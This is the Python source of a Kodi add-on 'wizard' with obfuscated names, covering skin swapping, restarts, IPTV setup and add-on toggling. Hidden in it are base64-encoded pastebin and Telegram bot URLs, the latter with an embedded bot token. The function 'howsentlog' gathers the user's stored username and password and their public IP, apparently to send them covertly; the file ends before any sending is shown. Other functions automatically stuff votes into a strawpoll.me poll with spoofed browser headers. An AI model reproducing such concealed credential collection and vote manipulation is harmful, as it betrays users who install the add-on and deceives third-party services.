# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	O0000OO0OOOO0O0O0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OO0OO000000O00OO0 =[];O000OO0O0O000O0O0 =[]#line:267
	for OOOO0OOO000O000O0 in sorted (O0000OO0OOOO0O0O0 ,key =lambda OOOOO0O000OO000O0 :OOOOO0O000OO000O0 ):#line:268
		O0OOOO00OOOOO0O0O =os .path .split (OOOO0OOO000O000O0 [:-1 ])[1 ]#line:269
		OO00000OO0O0O0O0O =os .path .join (OOOO0OOO000O000O0 ,'addon.xml')#line:270
		if os .path .exists (OO00000OO0O0O0O0O ):#line:271
			OO00000O0O0OO000O =open (OO00000OO0O0O0O0O )#line:272
			OO000000O0OO0O00O =OO00000O0O0OO000O .read ()#line:273
			OOO0O00O0O00OO00O =parseDOM2 (OO000000O0OO0O00O ,'addon',ret ='id')#line:274
			O0O0O0OOOOO0O00OO =O0OOOO00OOOOO0O0O if len (OOO0O00O0O00OO00O )==0 else OOO0O00O0O00OO00O [0 ]#line:275
			try :#line:276
				O00O0OOOOO0OOO0O0 =xbmcaddon .Addon (id =O0O0O0OOOOO0O00OO )#line:277
				OO0OO000000O00OO0 .append (O00O0OOOOO0OOO0O0 .getAddonInfo ('name'))#line:278
				O000OO0O0O000O0O0 .append (O0O0O0OOOOO0O00OO )#line:279
			except :#line:280
				pass #line:281
	OO0O00O00OO0O0O00 =[];OOOOOO0000OOO00O0 =0 #line:282
	OO00000OOO00O00OO =["Current Skin -- %s"%currSkin ()]+OO0OO000000O00OO0 #line:283
	OOOOOO0000OOO00O0 =DIALOG .select ("Select the Skin you want to swap with.",OO00000OOO00O00OO )#line:284
	if OOOOOO0000OOO00O0 ==-1 :return #line:285
	else :#line:286
		O00OO000000000OO0 =(OOOOOO0000OOO00O0 -1 )#line:287
		OO0O00O00OO0O0O00 .append (O00OO000000000OO0 )#line:288
		OO00000OOO00O00OO [OOOOOO0000OOO00O0 ]="%s"%(OO0OO000000O00OO0 [O00OO000000000OO0 ])#line:289
	if OO0O00O00OO0O0O00 ==None :return #line:290
	for OO0OO00OO0OO0OO00 in OO0O00O00OO0O0O00 :#line:291
		swapSkins (O000OO0O0O000O0O0 [OO0OO00OO0OO0OO00 ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (OO0OO00O00OO00OO0 ,title ="Error"):#line:296
	O000OOOOO000OO0O0 ='lookandfeel.skin'#line:297
	O0O00O000O0000000 =OO0OO00O00OO00OO0 #line:298
	O00000000O000OOOO =getOld (O000OOOOO000OO0O0 )#line:299
	OO00O00OO0OO0OOO0 =O000OOOOO000OO0O0 #line:300
	setNew (OO00O00OO0OO0OOO0 ,O0O00O000O0000000 )#line:301
	O00OO000O00O00OOO =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO000O00O00OOO <100 :#line:303
		O00OO000O00O00OOO +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (O0OOOOO0OOOO0000O ):#line:310
	try :#line:311
		O0OOOOO0OOOO0000O ='"%s"'%O0OOOOO0OOOO0000O #line:312
		OOOOOO0OOOOO00OOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OOOOO0OOOO0000O )#line:313
		O0OO000O0000OOOO0 =xbmc .executeJSONRPC (OOOOOO0OOOOO00OOO )#line:315
		O0OO000O0000OOOO0 =simplejson .loads (O0OO000O0000OOOO0 )#line:316
		if O0OO000O0000OOOO0 .has_key ('result'):#line:317
			if O0OO000O0000OOOO0 ['result'].has_key ('value'):#line:318
				return O0OO000O0000OOOO0 ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (O0OO0O0O000O000OO ,OO00O000OOO000000 ):#line:325
	try :#line:326
		O0OO0O0O000O000OO ='"%s"'%O0OO0O0O000O000OO #line:327
		OO00O000OOO000000 ='"%s"'%OO00O000OOO000000 #line:328
		OO0O0000OO0O00OO0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0OO0O0O000O000OO ,OO00O000OOO000000 )#line:329
		OO0O00O000OO00O00 =xbmc .executeJSONRPC (OO0O0000OO0O00OO0 )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			OO00OO000000OOOO0 =xbmcgui .DialogProgress ()#line:340
			OO00OO000000OOOO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			OO00OO000000OOOO0 .update (0 )#line:344
			for OO0O0O00000OOOOOO in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				OO00OO000000OOOO0 .update (int ((5 -OO0O0O00000OOOOOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0O0O00000OOOOOO ),'')#line:347
				if OO00OO000000OOOO0 .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			OO00OO000000OOOO0 =xbmcgui .DialogProgress ()#line:353
			OO00OO000000OOOO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			OO00OO000000OOOO0 .update (0 )#line:357
			for OO0O0O00000OOOOOO in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				OO00OO000000OOOO0 .update (int ((5 -OO0O0O00000OOOOOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0O0O00000OOOOOO ),'')#line:360
				if OO00OO000000OOOO0 .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O00O00O0OO0000OOO ='18773068'#line:373
    OOO0O00000000000O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00O00O0OO0000OOO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    O0O0000O000OOO0OO ='145273320'#line:387
    O0O00O0OOOOOOOOO0 ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        OO0O00OOOO00O0000 =O0O0000O000OOO0OO #line:390
    else :#line:391
        OO0O00OOOO00O0000 =O0O00O0OOOOOOOOO0 #line:392
    OOOO0O00OO0O0O00O ={'options':OO0O00OOOO00O0000 }#line:396
    O00OO0OO00OO00O0O =requests .post ('https://www.strawpoll.me/'+O00O00O0OO0000OOO ,headers =OOO0O00000000000O ,data =OOOO0O00OO0O0O00O )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        O0000O0O0OOO0OOO0 ='18773068'#line:402
        OOO0OOO00O00O0O00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0000O0O0OOO0OOO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O000O00OO000O0O0O ='145273320'#line:416
        O00OO00OOOOO0OOOO ={'options':O000O00OO000O0O0O }#line:422
        O0OO0000O00OOO0OO =requests .post ('https://www.strawpoll.me/'+O0000O0O0OOO0OOO0 ,headers =OOO0OOO00O00O0O00 ,data =O00OO00OOOOO0OOOO )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O000000000O0O00OO ='18773068'#line:429
        O000O0OOO0000OO00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O000000000O0O00OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        O0OOO00OOO000O000 ='145273321'#line:443
        OOOO0OOOOO0OO000O ={'options':O0OOO00OOO000O000 }#line:449
        OO000O0O0O0OOO000 =requests .post ('https://www.strawpoll.me/'+O000000000O0O00OO ,headers =O000O0OOO0000OO00 ,data =OOOO0OOOOO0OO000O )#line:451
   except :pass #line:452
def testcommand ():#line:456
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.telemedia')):#line:457
		O0O0OO00O0O00000O =xbmcaddon .Addon ('plugin.video.telemedia')#line:458
	if os .path .exists (os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","plugin.video.telemedia/database","td.binlog")):#line:459
		O0O0OO00O0O00000O .setSetting ('autologin','true')#line:460
def skin_homeselect ():#line:461
	try :#line:463
		O0O0OOO000OO00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:464
		OOO00OOOOO000O0OO =open (O0O0OOO000OO00OO0 ,'r')#line:466
		O0O0OOO000O0OOO0O =OOO00OOOOO000O0OO .read ()#line:467
		OOO00OOOOO000O0OO .close ()#line:468
		OOO00O0O0OO0OO000 ='<setting id="HomeS" type="string(.+?)/setting>'#line:469
		OO00OO0OOOOO0OO0O =re .compile (OOO00O0O0OO0OO000 ).findall (O0O0OOO000O0OOO0O )[0 ]#line:470
		OOO00OOOOO000O0OO =open (O0O0OOO000OO00OO0 ,'w')#line:471
		OOO00OOOOO000O0OO .write (O0O0OOO000O0OOO0O .replace ('<setting id="HomeS" type="string%s/setting>'%OO00OO0OOOOO0OO0O ,'<setting id="HomeS" type="string"></setting>'))#line:472
		OOO00OOOOO000O0OO .close ()#line:473
	except :#line:474
		pass #line:475
def autotrakt ():#line:478
    OO00000OOO0O000OO =(ADDON .getSetting ("auto_trk"))#line:479
    if OO00000OOO0O000OO =='true':#line:480
       from resources .libs import trk_aut #line:481
def traktsync ():#line:483
     O0O0OO000000OOO00 =(ADDON .getSetting ("auto_trk"))#line:484
     if O0O0OO000000OOO00 =='true':#line:485
       from resources .libs import trk_aut #line:488
     else :#line:489
        ADDON .openSettings ()#line:490
def imdb_synck ():#line:492
   try :#line:493
     O0OOOO00OO0O0O0OO =xbmcaddon .Addon ('plugin.video.exodusredux')#line:494
     OOOOO0O0OOOOOO0O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:495
     O000000O00O0OO0OO =(ADDON .getSetting ("imdb_sync"))#line:496
     OOOOOOO000O0O0OOO ="imdb.user"#line:497
     OO0OOOOO0OO000O00 ="accounts.informants.imdb.user"#line:498
     O0OOOO00OO0O0O0OO .setSetting (OOOOOOO000O0O0OOO ,str (O000000O00O0OO0OO ))#line:499
     OOOOO0O0OOOOOO0O0 .setSetting ('accounts.informants.imdb.enabled','true')#line:500
     OOOOO0O0OOOOOO0O0 .setSetting (OO0OOOOO0OO000O00 ,str (O000000O00O0OO0OO ))#line:501
   except :pass #line:502
def dis_or_enable_addon (OO0000O00O000O0OO ,OOOOO0000O0OO00O0 ,enable ="true"):#line:504
    import json #line:505
    O0OOOO000OOO00000 ='"%s"'%OO0000O00O000O0OO #line:506
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0000O00O000O0OO )and enable =="true":#line:507
        logging .warning ('already Enabled')#line:508
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0000O00O000O0OO )#line:509
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0000O00O000O0OO )and enable =="false":#line:510
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0000O00O000O0OO )#line:511
    else :#line:512
        OO00OO0OOO00OO0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0OOOO000OOO00000 ,enable )#line:513
        OOO00OOOOOOO00OOO =xbmc .executeJSONRPC (OO00OO0OOO00OO0O0 )#line:514
        O0O00OOO000OO00O0 =json .loads (OOO00OOOOOOO00OOO )#line:515
        if enable =="true":#line:516
            xbmc .log ("### Enabled %s, response = %s"%(OO0000O00O000O0OO ,O0O00OOO000OO00O0 ))#line:517
        else :#line:518
            xbmc .log ("### Disabled %s, response = %s"%(OO0000O00O000O0OO ,O0O00OOO000OO00O0 ))#line:519
    if OOOOO0000O0OO00O0 =='auto':#line:520
     return True #line:521
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:522
def iptvset ():#line:525
  try :#line:526
    O0OO00000O0OOO0OO =(ADDON .getSetting ("iptv_on"))#line:527
    if O0OO00000O0OOO0OO =='true':#line:529
       if KODIV >=17 and KODIV <18 :#line:531
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:532
         OO0O00O0000OO0O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:533
         OO000OOO0OO00O000 =(ADDON .getSetting ("iptvUrl"))#line:535
         OO0O00O0000OO0O0O .setSetting ('m3uUrl',OO000OOO0OO00O000 )#line:536
         OO0O000OO0OO0OO0O =(ADDON .getSetting ("epg_Url"))#line:537
         OO0O00O0000OO0O0O .setSetting ('epgUrl',OO0O000OO0OO0OO0O )#line:538
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:541
         iptvsimpldownpc ()#line:542
         wiz .kodi17Fix ()#line:543
         xbmc .sleep (1000 )#line:544
         OO0O00O0000OO0O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:545
         OO000OOO0OO00O000 =(ADDON .getSetting ("iptvUrl"))#line:546
         OO0O00O0000OO0O0O .setSetting ('m3uUrl',OO000OOO0OO00O000 )#line:547
         OO0O000OO0OO0OO0O =(ADDON .getSetting ("epg_Url"))#line:548
         OO0O00O0000OO0O0O .setSetting ('epgUrl',OO0O000OO0OO0OO0O )#line:549
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:551
         iptvsimpldown ()#line:552
         wiz .kodi17Fix ()#line:553
         xbmc .sleep (1000 )#line:554
         OO0O00O0000OO0O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:555
         OO000OOO0OO00O000 =(ADDON .getSetting ("iptvUrl"))#line:556
         OO0O00O0000OO0O0O .setSetting ('m3uUrl',OO000OOO0OO00O000 )#line:557
         OO0O000OO0OO0OO0O =(ADDON .getSetting ("epg_Url"))#line:558
         OO0O00O0000OO0O0O .setSetting ('epgUrl',OO0O000OO0OO0OO0O )#line:559
  except :pass #line:560
def howsentlog ():#line:567
       try :#line:568
          import json #line:569
          OOO0000O000O000OO =(ADDON .getSetting ("user"))#line:570
          O0O0000O0OOOOO00O =(ADDON .getSetting ("pass"))#line:571
          OO0O0000O0OO00O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:572
          OOOO0000O0O0OOO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:574
          OO000O0O0O000O0OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:575
